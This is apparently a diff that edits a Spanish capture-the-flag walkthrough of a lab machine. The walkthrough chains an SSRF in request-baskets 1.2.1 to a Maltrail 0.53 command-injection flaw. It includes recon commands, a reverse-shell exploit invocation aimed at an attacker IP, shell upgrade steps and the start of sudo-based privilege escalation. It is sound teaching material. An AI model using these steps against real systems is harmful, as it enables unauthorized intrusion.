@@ -2,9 +2,15 @@
 
 # Reconocimiento
 ---
+## Escaneo de puertos
+
+Iniciamos con un escaneo de puertos utilizando Nmap para identificar servicios y versiones en la máquina.
+
 ```bash
 nmap -p- -sS -n -Pn --min-rate 5000 -vvv 10.10.11.224 -oG ports
 ```
+
+El resultado nos muestra tres puertos abiertos: el puerto SSH (22), el puerto web (80) y un puerto desconocido (55555).
 
 ```bash
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-22 19:57 -03
@@ -33,9 +39,13 @@ Nmap done: 1 IP address (1 host up) scanned in 18.43 seconds
            Raw packets sent: 87544 (3.852MB) | Rcvd: 73984 (2.961MB)
 ```
 
+Realizamos un escaneo detallado de los puertos identificados.
+
 ```bash
 nmap -p 22,80,8338,55555 -sCV -n -Pn --min-rate 5000 10.10.11.224 -oN openPorts
 ```
+
+El escaneo detallado nos proporciona información sobre los servicios en ejecución y sus versiones.
 
 ```bash
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-22 19:59 -03
@@ -115,11 +125,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 103.38 seconds
 ```
 
+Adicionalmente, utilizamos herramientas como `whatweb` y `ffuf` para obtener más información sobre el servicio web en el puerto 55555.
+
 ```bash
 whatweb http://10.10.11.224:55555/web
 
 http://10.10.11.224:55555/web [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, IP[10.10.11.224], JQuery[3.2.1], PasswordField, Script, Title[Request Baskets]
 ```
+
+La herramienta `ffuf` nos ayuda a realizar una búsqueda de directorios en la URL.
 
 ```bash
 ffuf -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.11.224:55555/FUZZ
@@ -167,8 +181,7 @@ Web                     [Status: 301, Size: 39, Words: 3, Lines: 3, Duration: 15
 WEB                     [Status: 301, Size: 39, Words: 3, Lines: 3, Duration: 157ms]
 ```
 
-Al visitar la URL nos encontramos con la aplicación [request-baskets](https://rbaskets.in/web)  
-[http://10.10.11.224:55555/web](http://10.10.11.224:55555/web)
+Al visitar la URL [http://10.10.11.224:55555/web](http://10.10.11.224:55555/web), descubrimos que la aplicación se llama "[request-baskets](https://rbaskets.in/web)" y está en la versión 1.2.1.
 
 ```
 Powered by request-baskets | Version: 1.2.1 
@@ -176,9 +189,7 @@ Powered by request-baskets | Version: 1.2.1
 
 # Explotación
 ---
-La versión 1.2.1 de request-baskets es vulnerable a un Server Side Request Forgery (SSRF)
-
-[CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)
+La versión 1.2.1 de request-baskets es vulnerable a un Server Side Request Forgery (SSRF) identificado por el [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163).
 
 Para explotar la vulnerabilidad creamos una basket, modificamos la "Configuration Settings"
 
@@ -193,17 +204,11 @@ Creamos una request
 http://10.10.11.224:55555/<basket-name>
 ```
 
-Ingreamos a la URL de la basket creada
-[http://\<victim-ip\>:55555/\<basket\>](http://10.10.11.224:55555/<basket>)
-
-Nos va a redireccionar a la web que está corriendo en el localhost del servidor en el puerto 80.
-En el localhost corre la aplicación Maltrail en la versión 0.53 que es vulnerable a una ejecución remota de comandos.
+Ingresamos a la URL de la basket creada `http://<target-ip>:<port>/<basket>`, lo que nos redirige a la web en ejecución en el localhost del servidor en el puerto 80. Nos encontramos la aplicación [Maltrail](https://github.com/stamparm/maltrail/blob/master/README.md) en la versión 0.53, la cual es vulnerable a una ejecución remota de comandos.
 
 ```
 Powered by Maltrail (v0.53)
 ```
-
-[Maltrail](https://github.com/stamparm/maltrail/blob/master/README.md)
 
 Creamos un script con Python para ganar acceso al sistema
 
@@ -253,7 +258,7 @@ Ejecutamos el exploit pasandole nuestra ip de atacante, el puerto por el que est
 python3 exploit.py <ip-atacante> <puerto-en-escucha> http://<ip-victima>:55555/<basket>
 ```
 
-Tratamiento de TTY para tener mayor control de la consola
+Para obtener un control total de la consola, realizamos el tratamiento de la TTY.
 
 ```bash
 script /dev/null -c bash
@@ -274,11 +279,13 @@ cat /home/puma/user.txt
 
 # Escalada de privilegios
 ---
-Listar los privilegios del usuario actual
+Listamos los privilegios del usuario actual.
 
 ```bash
 sudo -l
 ```
+
+El resultado muestra que el usuario puma puede ejecutar `sudo /usr/bin/systemctl status trail.service` sin necesidad de contraseña.
 
 ```bash
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
